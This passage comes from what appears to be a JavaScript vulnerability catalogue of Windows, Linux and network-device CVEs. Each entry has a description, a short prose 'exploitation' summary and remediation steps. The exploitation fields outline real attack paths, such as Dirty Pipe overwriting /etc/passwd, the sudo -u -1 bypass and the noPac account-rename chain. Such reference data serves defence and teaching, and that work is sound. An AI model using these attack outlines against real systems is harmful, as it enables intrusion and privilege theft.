    cvss: 9.8,
    affected: "Windows XP through Windows Server 2012 R2 (SMBv1)",
    description: "Remote code execution in Windows SMBv1 server. A buffer overflow in the SMBv1 transaction handling allows remote attackers to execute arbitrary code. Used by WannaCry and NotPetya ransomware.",
    exploitation: "Send crafted SMBv1 packets to the target system on port 445 to trigger a buffer overflow in the Windows SMB server driver.",
    remediation: "Apply Microsoft security update MS17-010. Disable SMBv1. Block SMB traffic on port 445 from untrusted networks.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-0144"]
  },
  {
    id: "CVE-2017-0145",
    name: "EternalRomance",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows XP through Windows Server 2012 R2 (SMBv1)",
    description: "Remote code execution in Windows SMBv1 via a type confusion vulnerability in transaction handling. Part of the same SMBv1 vulnerability group as EternalBlue.",
    exploitation: "Send crafted SMBv1 transaction requests that trigger a type confusion in the Windows SMB driver, allowing kernel-level code execution.",
    remediation: "Apply Microsoft security update MS17-010. Disable SMBv1 protocol.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-0145"]
  },
  {
    id: "CVE-2020-0796",
    name: "SMBGhost",
    severity: "Critical",
    cvss: 10.0,
    affected: "Windows 10 version 1903, 1909; Windows Server version 1903, 1909",
    description: "Remote code execution in SMBv3 compression. A buffer overflow in the decompression routine of the SMBv3.1.1 protocol allows unauthenticated remote code execution.",
    exploitation: "Send a specially crafted compressed SMBv3 packet to the target server to trigger a buffer overflow in the SMB server driver.",
    remediation: "Apply Microsoft security update KB4551762. Disable SMBv3 compression as a workaround.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-0796"]
  },
  {
    id: "CVE-2021-1675",
    name: "PrintNightmare (LPE)",
    severity: "High",
    cvss: 8.8,
    affected: "Windows 7 through Windows Server 2019",
    description: "Local privilege escalation in the Windows Print Spooler service via improper validation of the installation of printer drivers. Originally classified as LPE, later found to enable RCE.",
    exploitation: "Use the AddPrinterDriverEx function to install a malicious printer driver DLL that executes with SYSTEM privileges.",
    remediation: "Apply the June 2021 Microsoft security updates. Disable the Print Spooler service on systems where printing is not required.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-1675"]
  },
  {
    id: "CVE-2021-34527",
    name: "PrintNightmare (RCE)",
    severity: "Critical",
    cvss: 8.8,
    affected: "Windows 7 through Windows Server 2019",
    description: "Remote code execution variant of PrintNightmare in the Windows Print Spooler service. Allows any authenticated user to install a printer driver from a remote share and execute code as SYSTEM.",
    exploitation: "Point to a malicious printer driver DLL on a remote SMB share and use the AddPrinterDriverEx RPC call to load and execute it with SYSTEM privileges.",
    remediation: "Apply the July 2021 out-of-band Microsoft security update. Disable the Print Spooler service. Restrict Point and Print to approved servers.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-34527"]
  },
  {
    id: "CVE-2021-36934",
    name: "HiveNightmare / SeriousSAM",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 10 versions 1809 through 21H1",
    description: "Local privilege escalation in Windows due to overly permissive ACLs on system registry hive files (SAM, SYSTEM, SECURITY), allowing standard users to read security-sensitive data.",
    exploitation: "Read the SAM database shadow copies using Volume Shadow Copy Service to extract password hashes, then use pass-the-hash to escalate privileges.",
    remediation: "Apply the July 2021 Microsoft security updates. Delete Volume Shadow Copy snapshots. Restrict ACLs on registry hive files.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-36934"]
  },
  {
    id: "CVE-2022-21907",
    name: "HTTP Protocol Stack RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows 10 version 1809+, Windows 11, Windows Server 2019, 2022",
    description: "Remote code execution in the Windows HTTP Protocol Stack (http.sys). An unauthenticated attacker can send a specially crafted packet to a targeted server to trigger code execution in the kernel.",
    exploitation: "Send a crafted HTTP request with specific trailer headers that trigger a use-after-free vulnerability in the http.sys driver.",
    remediation: "Apply the January 2022 Microsoft security updates. Disable HTTP Trailer Support as a temporary workaround.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-21907"]
  },
  {
    id: "CVE-2021-42287",
    name: "sAMAccountName Spoofing (noPac Part 1)",
    severity: "High",
    cvss: 7.5,
    affected: "Windows Server 2008 through 2022 (Active Directory Domain Controllers)",
    description: "Privilege escalation in Active Directory where a standard domain user can impersonate a domain controller through sAMAccountName spoofing in Kerberos PAC handling.",
    exploitation: "Create a machine account, rename it to match a domain controller's sAMAccountName without the trailing $, request a TGT, rename back, then request a service ticket which grants DC-level access.",
    remediation: "Apply the November 2021 Microsoft security updates. Set the msDS-MachineAccountQuota attribute to 0.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-42287"]
  },
  {
    id: "CVE-2021-42278",
    name: "Machine Account sAMAccountName Spoofing (noPac Part 2)",
    severity: "High",
    cvss: 7.5,
    affected: "Windows Server 2008 through 2022 (Active Directory Domain Controllers)",
    description: "Security bypass in Active Directory allowing a user to modify the sAMAccountName of a computer account they own, enabling domain controller impersonation when chained with CVE-2021-42287.",
    exploitation: "Modify the sAMAccountName of a machine account to match a domain controller name, then use the impersonated identity to access domain admin resources.",
    remediation: "Apply the November 2021 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-42278"]
  },
  {
    id: "CVE-2022-26923",
    name: "Active Directory Certificate Services Privilege Escalation",
    severity: "High",
    cvss: 8.8,
    affected: "Windows Server 2008 through 2022 with Active Directory Certificate Services",
    description: "Privilege escalation in AD CS where a low-privileged user can manipulate a machine account's dNSHostName attribute to obtain a certificate for a domain controller, enabling domain admin access.",
    exploitation: "Create a machine account, set its dNSHostName to match a domain controller, request a certificate via the default Machine template, then use it for Kerberos authentication as the DC.",
    remediation: "Apply the May 2022 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-26923"]
  },
  {
    id: "CVE-2021-34481",
    name: "Windows Print Spooler Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 7 through Windows 11, Windows Server 2008 through 2022",
    description: "Local privilege escalation in the Windows Print Spooler service via improper permission checks when installing printer drivers.",
    exploitation: "Install a crafted printer driver that executes with SYSTEM privileges by exploiting insufficient permission checks in the driver installation process.",
    remediation: "Apply the August 2021 Microsoft security updates. Restrict Point and Print driver installation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-34481"]
  },
  {
    id: "CVE-2022-37969",
    name: "Windows CLFS Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Local privilege escalation in the Windows Common Log File System (CLFS) driver. A use-after-free vulnerability allows an attacker to gain SYSTEM privileges. Exploited in the wild.",
    exploitation: "Create and manipulate a corrupted CLFS base log file to trigger a use-after-free condition in the kernel driver.",
    remediation: "Apply the September 2022 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-37969"]
  },
  {
    id: "CVE-2023-21746",
    name: "LocalPotato (Windows NTLM EoP)",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Local privilege escalation in Windows NTLM authentication. A local attacker can coerce the NTLM authentication of a privileged process and relay it to gain elevated access.",
    exploitation: "Coerce a local NTLM authentication and perform a local relay attack to write arbitrary files as SYSTEM.",
    remediation: "Apply the January 2023 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-21746"]
  },
  {
    id: "CVE-2023-28252",
    name: "Windows CLFS Driver Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Local privilege escalation in the Windows Common Log File System driver. An out-of-bounds write allows an attacker to gain SYSTEM privileges. Exploited in the wild by Nokoyawa ransomware.",
    exploitation: "Manipulate CLFS log file metadata to trigger an out-of-bounds write in the kernel driver, achieving arbitrary kernel memory modification.",
    remediation: "Apply the April 2023 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-28252"]
  },
  {
    id: "CVE-2023-36884",
    name: "Office and Windows HTML RCE",
    severity: "High",
    cvss: 8.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022, Microsoft Office",
    description: "Remote code execution via specially crafted Microsoft Office documents. Exploited in the wild by the Storm-0978 threat group via phishing campaigns.",
    exploitation: "Send a crafted Office document that exploits HTML rendering to execute arbitrary code when the victim opens it.",
    remediation: "Apply the August 2023 Microsoft security updates. Block Office applications from creating child processes via ASR rules.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-36884"]
  },
  {
    id: "CVE-2022-34718",
    name: "Windows TCP/IP RCE (IPv6)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows 7 through Windows 11, Windows Server 2008 through 2022 with IPv6 and IPsec enabled",
    description: "Remote code execution in the Windows TCP/IP stack when processing IPv6 packets with IPsec enabled. An unauthenticated attacker can send specially crafted IPv6 packets.",
    exploitation: "Send specially crafted IPv6 packets to a target system with IPsec enabled to trigger a buffer overflow in the TCP/IP driver.",
    remediation: "Apply the September 2022 Microsoft security updates. Disable IPsec on IPv6 if not required.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-34718"]
  },
  {
    id: "CVE-2020-16898",
    name: "Bad Neighbor (ICMPv6 RCE)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows 10 version 1709+, Windows Server 2019",
    description: "Remote code execution in the Windows TCP/IP stack due to improper handling of ICMPv6 Router Advertisement packets with recursive DNS server options.",
    exploitation: "Send malformed ICMPv6 Router Advertisement packets with oversized Recursive DNS Server option headers to trigger a buffer overflow.",
    remediation: "Apply the October 2020 Microsoft security updates. Disable ICMPv6 RDNSS as a workaround.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-16898"]
  },
  {
    id: "CVE-2021-40449",
    name: "Win32k Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 7 through Windows 11, Windows Server 2008 through 2022",
    description: "Use-after-free vulnerability in the Win32k kernel driver allowing local privilege escalation to SYSTEM. Exploited in the wild by the MysterySnail RAT campaign.",
    exploitation: "Trigger a use-after-free in the NtGdiResetDC callback mechanism in the Win32k driver to achieve kernel code execution.",
    remediation: "Apply the October 2021 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-40449"]
  },
  {
    id: "CVE-2022-24521",
    name: "Windows CLFS Driver Information Disclosure",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Privilege escalation in the Windows Common Log File System driver allowing an attacker who has already gained code execution to escalate to SYSTEM privileges.",
    exploitation: "Craft a malicious CLFS log file to trigger a vulnerability in the kernel driver that allows privilege escalation.",
    remediation: "Apply the April 2022 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-24521"]
  },
  {
    id: "CVE-2021-24074",
    name: "Windows TCP/IP RCE (IPv4)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows 7 through Windows 10, Windows Server 2008 through 2019",
    description: "Remote code execution in the Windows TCP/IP stack when processing crafted IPv4 packets. The vulnerability exists in the IP source routing handling.",
    exploitation: "Send crafted IPv4 packets with malicious source routing options to trigger a vulnerability in the TCP/IP driver.",
    remediation: "Apply the February 2021 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-24074"]
  },
  {
    id: "CVE-2023-36025",
    name: "Windows SmartScreen Bypass",
    severity: "High",
    cvss: 8.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Security feature bypass in Windows SmartScreen allowing attackers to bypass SmartScreen checks and associated prompts via a crafted Internet Shortcut (.url) file.",
    exploitation: "Create a crafted .url file that references a malicious payload in a way that bypasses SmartScreen protection warnings.",
    remediation: "Apply the November 2023 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-36025"]
  },
  {
    id: "CVE-2024-21338",
    name: "Windows Kernel AppLocker Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 10, Windows 11, Windows Server 2019, 2022",
    description: "Privilege escalation in the Windows kernel via the appid.sys AppLocker driver. Exploited in the wild by the Lazarus Group to achieve kernel read/write primitives.",
    exploitation: "Use a crafted IOCTL call to the appid.sys driver to gain kernel read/write access and disable security software.",
    remediation: "Apply the February 2024 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-21338"]
  },
  {
    id: "CVE-2024-21412",
    name: "Windows Internet Shortcut SmartScreen Bypass",
    severity: "High",
    cvss: 8.1,
    affected: "Windows 10, Windows 11, Windows Server 2019, 2022",
    description: "Security feature bypass allowing attackers to circumvent Windows Mark of the Web (MotW) protections using crafted Internet Shortcut files. Exploited by the Water Hydra APT group.",
    exploitation: "Create a chain of Internet Shortcut files that ultimately reference a malicious payload without triggering SmartScreen protections.",
    remediation: "Apply the February 2024 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-21412"]
  },
  {
    id: "CVE-2024-30088",
    name: "Windows Kernel Privilege Escalation",
    severity: "High",
    cvss: 7.0,
    affected: "Windows 10, Windows 11, Windows Server 2016, 2019, 2022",
    description: "Race condition in the Windows kernel allowing local privilege escalation. A TOCTOU vulnerability in the NtQueryInformationToken system call enables attackers to gain SYSTEM privileges.",
    exploitation: "Exploit a race condition in the kernel token handling to modify security tokens and elevate from a standard user to SYSTEM.",
    remediation: "Apply the June 2024 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-30088"]
  },
  {
    id: "CVE-2023-35628",
    name: "Windows MSHTML Platform RCE",
    severity: "Critical",
    cvss: 8.1,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Remote code execution in the Windows MSHTML platform. An attacker could exploit this via a specially crafted email sent to Microsoft Outlook, triggering execution when the email is retrieved.",
    exploitation: "Send a specially crafted email that triggers the MSHTML vulnerability during retrieval by the Outlook email client, requiring no user interaction.",
    remediation: "Apply the December 2023 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-35628"]
  },
  {
    id: "CVE-2024-38063",
    name: "Windows TCP/IP IPv6 RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows 10, Windows 11, Windows Server 2008 through 2022",
    description: "Remote code execution in the Windows TCP/IP stack when processing specially crafted IPv6 packets. An unauthenticated attacker on an adjacent network can trigger code execution without user interaction.",
    exploitation: "Send specially crafted IPv6 packets to the target system to trigger an integer underflow in the TCP/IP driver leading to code execution.",
    remediation: "Apply the August 2024 Microsoft security updates. Disable IPv6 if not required as a temporary mitigation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-38063"]
  },

  // ============================================================
  // LINUX / UNIX VULNERABILITIES (20+)
  // ============================================================

  {
    id: "CVE-2021-4034",
    name: "PwnKit (Polkit pkexec)",
    severity: "High",
    cvss: 7.8,
    affected: "Polkit pkexec on all major Linux distributions (since 2009)",
    description: "Local privilege escalation in Polkit's pkexec utility. An out-of-bounds read/write in command-line argument handling allows any local user to gain root privileges.",
    exploitation: "Execute pkexec with a carefully crafted environment that exploits the argument parsing to inject an environment variable processed as a command-line argument.",
    remediation: "Update Polkit to the latest version. Apply vendor-specific patches. Remove the SUID bit from pkexec as a temporary measure.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-4034"]
  },
  {
    id: "CVE-2022-0847",
    name: "Dirty Pipe",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 5.8 through 5.16.10",
    description: "Local privilege escalation in the Linux kernel pipe implementation. A flaw in the pipe buffer management allows overwriting data in arbitrary cached pages, including read-only files.",
    exploitation: "Open a read-only file (such as /etc/passwd), splice it into a pipe, then write arbitrary data to the pipe, which overwrites the cached file content.",
    remediation: "Upgrade to Linux kernel 5.16.11, 5.15.25, or 5.10.102.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-0847"]
  },
  {
    id: "CVE-2016-5195",
    name: "Dirty COW",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 2.6.22 through 4.8.2",
    description: "Race condition in the Linux kernel memory management subsystem's copy-on-write (COW) mechanism allows local privilege escalation by writing to read-only memory mappings.",
    exploitation: "Exploit the race condition in the madvise and write system calls to write to memory-mapped read-only files, such as /etc/passwd or SUID binaries.",
    remediation: "Upgrade to Linux kernel 4.8.3 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2016-5195"]
  },
  {
    id: "CVE-2022-2588",
    name: "Linux Kernel route4 Use-After-Free",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel before 5.19",
    description: "Use-after-free vulnerability in the route4 network traffic classifier in the Linux kernel. A local attacker can exploit this to escalate privileges.",
    exploitation: "Manipulate the route4 filter reference counting to trigger a use-after-free, then use the freed object to gain kernel code execution.",
    remediation: "Upgrade to Linux kernel 5.19 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-2588"]
  },
  {
    id: "CVE-2022-0185",
    name: "Linux Kernel File System Context Heap Overflow",
    severity: "High",
    cvss: 8.4,
    affected: "Linux kernel 5.1 through 5.16.1",
    description: "Heap-based buffer overflow in the legacy_parse_param function of the Linux kernel's filesystem context handling, allowing local privilege escalation and container escape.",
    exploitation: "Trigger the heap overflow through filesystem mount operations using crafted parameters to overwrite adjacent kernel memory.",
    remediation: "Upgrade to Linux kernel 5.16.2 or later. Restrict unprivileged user namespaces.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-0185"]
  },
  {
    id: "CVE-2021-33909",
    name: "Sequoia (Linux Kernel filesystem size_t-to-int)",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 3.16 through 5.13.3",
    description: "Local privilege escalation via a size_t-to-int type conversion vulnerability in the filesystem layer. Creating a deeply nested directory structure triggers an out-of-bounds write.",
    exploitation: "Create a deeply nested directory path exceeding 1GB to trigger an integer overflow in the seq_file code path, leading to out-of-bounds writes in kernel memory.",
    remediation: "Upgrade to Linux kernel 5.13.4 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-33909"]
  },
  {
    id: "CVE-2023-0386",
    name: "Linux OverlayFS Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel before 6.2",
    description: "Local privilege escalation in the OverlayFS filesystem. A flaw in the handling of SUID-capable files allows a user in a user namespace to set privileged attributes on upper filesystem files.",
    exploitation: "Mount an overlay filesystem in a user namespace with a crafted lower directory containing SUID files to gain root privileges in the initial namespace.",
    remediation: "Upgrade to Linux kernel 6.2 or later. Restrict unprivileged OverlayFS mounts.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-0386"]
  },
  {
    id: "CVE-2023-32233",
    name: "Linux Kernel Netfilter nf_tables Use-After-Free",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel before 6.3.1",
    description: "Use-after-free in the Netfilter nf_tables subsystem allowing local privilege escalation. Anonymous sets are improperly handled, leading to a use-after-free condition.",
    exploitation: "Create and manipulate Netfilter nf_tables anonymous sets to trigger a use-after-free, then exploit the freed object for kernel code execution.",
    remediation: "Upgrade to Linux kernel 6.3.2 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-32233"]
  },
  {
    id: "CVE-2022-25636",
    name: "Linux Kernel Netfilter Heap Out-of-Bounds Write",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 5.4 through 5.16.9",
    description: "Heap out-of-bounds write in the Netfilter nft_fwd_dup_netdev_offload function in the Linux kernel, allowing local privilege escalation.",
    exploitation: "Create crafted nftables rules with hardware offload support to trigger an out-of-bounds write in kernel heap memory.",
    remediation: "Upgrade to Linux kernel 5.16.10 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-25636"]
  },
  {
    id: "CVE-2022-34918",
    name: "Linux Kernel Netfilter nft_set_elem_init Heap Overflow",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 5.8 through 5.18.8",
    description: "Heap buffer overflow in the Netfilter nft_set_elem_init function allowing local privilege escalation from an unprivileged user namespace.",
    exploitation: "Create crafted Netfilter set elements with oversized data that triggers a heap buffer overflow in the kernel.",
    remediation: "Upgrade to Linux kernel 5.18.9 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-34918"]
  },
  {
    id: "CVE-2023-2640",
    name: "Ubuntu OverlayFS Privilege Escalation",
    severity: "High",
    cvss: 7.8,
    affected: "Ubuntu kernels with OverlayFS patches (Ubuntu 23.04, 22.10, 22.04, 20.04, 18.04)",
    description: "Ubuntu-specific privilege escalation in OverlayFS where trusted extended attributes in the upper filesystem are not properly checked, allowing SUID capabilities to be applied.",
    exploitation: "Mount an overlay filesystem in a user namespace and set trusted extended attributes on files to gain root-level capabilities.",
    remediation: "Apply Ubuntu kernel updates. Restrict unprivileged user namespaces.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-2640"]
  },
  {
    id: "CVE-2023-35001",
    name: "Linux Kernel nft_byteorder Stack Buffer Overflow",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel before 6.3.9",
    description: "Stack-based buffer overflow in the Netfilter nft_byteorder expression allowing local privilege escalation via crafted nftables rules.",
    exploitation: "Create nftables rules with crafted byteorder expressions that overflow the stack buffer used for element processing.",
    remediation: "Upgrade to Linux kernel 6.3.9 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-35001"]
  },
  {
    id: "CVE-2024-1086",
    name: "Linux Kernel Netfilter nf_tables Double-Free",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 3.15 through 6.7.1",
    description: "Double-free vulnerability in the Netfilter nf_tables component allowing local privilege escalation. A flaw in the nft_verdict_init function allows a double-free via the NF_DROP verdict.",
    exploitation: "Create nftables rules that trigger a double-free in the verdict handling, then exploit the corrupted memory to gain kernel code execution.",
    remediation: "Upgrade to Linux kernel 6.7.2 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-1086"]
  },
  {
    id: "CVE-2021-22555",
    name: "Linux Kernel Netfilter xt_compat Out-of-Bounds Write",
    severity: "High",
    cvss: 7.8,
    affected: "Linux kernel 2.6.19 through 5.12",
    description: "Heap out-of-bounds write in the Netfilter xt_compat code path allowing local privilege escalation and container escape.",
    exploitation: "Use the compat setsockopt interface with crafted IPT_SO_SET_REPLACE options to trigger a heap write past the allocated buffer.",
    remediation: "Upgrade to Linux kernel 5.12 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-22555"]
  },
  {
    id: "CVE-2023-4911",
    name: "Looney Tunables (glibc ld.so Buffer Overflow)",
    severity: "High",
    cvss: 7.8,
    affected: "glibc 2.34 through 2.38 on major Linux distributions",
    description: "Buffer overflow in the GNU C Library dynamic loader (ld.so) when processing the GLIBC_TUNABLES environment variable, allowing local privilege escalation.",
    exploitation: "Set a crafted GLIBC_TUNABLES environment variable and execute a SUID binary to trigger the buffer overflow in the dynamic loader.",
    remediation: "Update glibc to version 2.38-4 or later. Apply vendor-specific patches.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-4911"]
  },
  {
    id: "CVE-2022-3328",
    name: "snap-confine Race Condition",
    severity: "High",
    cvss: 7.8,
    affected: "snapd before 2.57.6 on Ubuntu",
    description: "Race condition in snap-confine's must_mkdir_and_open_with_perms function, combined with other vulnerabilities in multipathd (CVE-2022-41974) for privilege escalation.",
    exploitation: "Exploit the TOCTOU race condition in snap-confine when creating mount namespace directories to redirect mounts and chain with multipathd vulnerabilities.",
    remediation: "Update snapd to version 2.57.6 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-3328"]
  },
  {
    id: "CVE-2019-14287",
    name: "Sudo User ID Bypass",
    severity: "High",
    cvss: 8.8,
    affected: "Sudo before 1.8.28",
    description: "When a sudoers entry allows running commands as any user except root (e.g., ALL, !root), an attacker can bypass this restriction by specifying the user ID -1 or 4294967295.",
    exploitation: "Execute sudo with the -u flag set to user ID -1 or 4294967295, which resolves to UID 0 (root) due to an integer overflow.",
    remediation: "Upgrade sudo to version 1.8.28 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-14287"]
  },
  {
    id: "CVE-2024-6387",
    name: "regreSSHion (OpenSSH Signal Handler Race)",
    severity: "High",
    cvss: 8.1,
    affected: "OpenSSH 8.5p1 through 9.7p1 on glibc-based Linux systems",
    description: "Remote unauthenticated code execution in OpenSSH server via a race condition in the signal handler. A regression of CVE-2006-5051 that reintroduced an async-signal-unsafe function call.",
    exploitation: "Send multiple connection attempts that trigger the SIGALRM signal handler during the authentication grace period, exploiting a race condition to achieve code execution as root.",
    remediation: "Upgrade to OpenSSH 9.8p1 or later. Reduce LoginGraceTime as a partial mitigation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"]
  },
  {
    id: "CVE-2021-44832",
    name: "Log4j JDBC Appender RCE",
    severity: "Medium",
    cvss: 6.6,
    affected: "Apache Log4j 2.0-beta7 to 2.17.0",
    description: "Remote code execution in Apache Log4j via JDBC Appender data source configuration with JNDI lookup. Requires the attacker to modify the logging configuration.",
    exploitation: "If the attacker can modify the Log4j configuration, configure a JDBC Appender with a JNDI data source URL pointing to a malicious server.",
    remediation: "Upgrade to Log4j 2.17.1, 2.12.4, or 2.3.2.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44832"]
  },
  {
    id: "CVE-2023-6246",
    name: "glibc __fortify_fail Heap Buffer Overflow",
    severity: "High",
    cvss: 7.8,
    affected: "glibc 2.36 through 2.38 on major Linux distributions",
    description: "Heap-based buffer overflow in the __vsyslog_internal function of glibc, reachable through the syslog and vsyslog functions. Allows local privilege escalation.",
    exploitation: "Trigger the vulnerability through syslog calls with crafted input that causes a heap buffer overflow in the __vsyslog_internal function of a SUID binary.",
    remediation: "Update glibc to a patched version. Apply vendor-specific security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-6246"]
  },
  {
    id: "CVE-2022-29799",
    name: "Nimbuspwn (networkd-dispatcher Directory Traversal)",
    severity: "High",
    cvss: 7.8,
    affected: "networkd-dispatcher before 2.2.1 on Linux",
    description: "Directory traversal and symlink race condition in networkd-dispatcher, a dispatcher daemon for systemd-networkd connection status changes, allowing local privilege escalation to root.",
    exploitation: "Exploit the TOCTOU race condition and directory traversal in networkd-dispatcher's signal handling to execute arbitrary scripts as root.",
    remediation: "Update networkd-dispatcher to version 2.2.1 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-29799"]
  },

  // ============================================================
  // NETWORK INFRASTRUCTURE VULNERABILITIES (15+)
  // ============================================================

  {
    id: "CVE-2023-20198",
    name: "Cisco IOS XE Web UI Privilege Escalation",
    severity: "Critical",
    cvss: 10.0,
    affected: "Cisco IOS XE with Web UI enabled",
    description: "Privilege escalation in the web UI of Cisco IOS XE allowing an unauthenticated remote attacker to create an account with privilege level 15 access. Widely exploited in the wild.",
    exploitation: "Send crafted HTTP requests to the IOS XE web UI to create a local admin account, then chain with CVE-2023-20273 to deploy an implant.",
    remediation: "Disable the HTTP/HTTPS Server feature on IOS XE devices exposed to the internet. Apply Cisco security updates when available.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-20198"]
  },
  {
    id: "CVE-2023-20273",
    name: "Cisco IOS XE Web UI Command Injection",
    severity: "High",
    cvss: 7.2,
    affected: "Cisco IOS XE with Web UI enabled",
    description: "Command injection in Cisco IOS XE web UI allowing an authenticated attacker to inject commands at the root level. Chained with CVE-2023-20198 for unauthenticated RCE.",
    exploitation: "After creating an admin account via CVE-2023-20198, use the command injection vulnerability to deploy a Lua-based implant on the device.",
    remediation: "Apply Cisco IOS XE security updates. Disable the web UI on internet-facing devices.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-20273"]
  },
  {
    id: "CVE-2018-0171",
    name: "Cisco Smart Install RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Cisco IOS and IOS XE with Smart Install enabled",
    description: "Remote code execution in Cisco Smart Install protocol allowing an unauthenticated attacker to modify the TFTP server address, download the startup configuration, or trigger a reload.",
    exploitation: "Send crafted Smart Install messages to TCP port 4786 to modify the device configuration, extract credentials, or execute arbitrary code.",
    remediation: "Disable the Smart Install feature using 'no vstack' on Cisco switches. Apply IOS security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2018-0171"]
  },
  {
    id: "CVE-2023-46805",
    name: "Ivanti Connect Secure Authentication Bypass",
    severity: "Critical",
    cvss: 8.2,
    affected: "Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure 9.x, 22.x",
    description: "Authentication bypass in the web component of Ivanti Connect Secure and Policy Secure allowing remote attackers to access restricted resources. Chained with CVE-2024-21887 for RCE.",
    exploitation: "Send crafted requests that bypass the authentication check on the ICS web server to access internal API endpoints without credentials.",
    remediation: "Apply the Ivanti security patches. Import the Ivanti mitigation XML as a temporary workaround.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-46805"]
  },
  {
    id: "CVE-2024-21887",
    name: "Ivanti Connect Secure Command Injection",
    severity: "Critical",
    cvss: 9.1,
    affected: "Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure 9.x, 22.x",
    description: "Command injection in the web components of Ivanti Connect Secure allowing an authenticated administrator to execute arbitrary commands. When chained with CVE-2023-46805, allows unauthenticated RCE.",
    exploitation: "After bypassing authentication via CVE-2023-46805, inject commands through the web interface API endpoints to execute arbitrary code on the appliance.",
    remediation: "Apply the Ivanti security patches. Perform a factory reset and rebuild from a known clean image.",
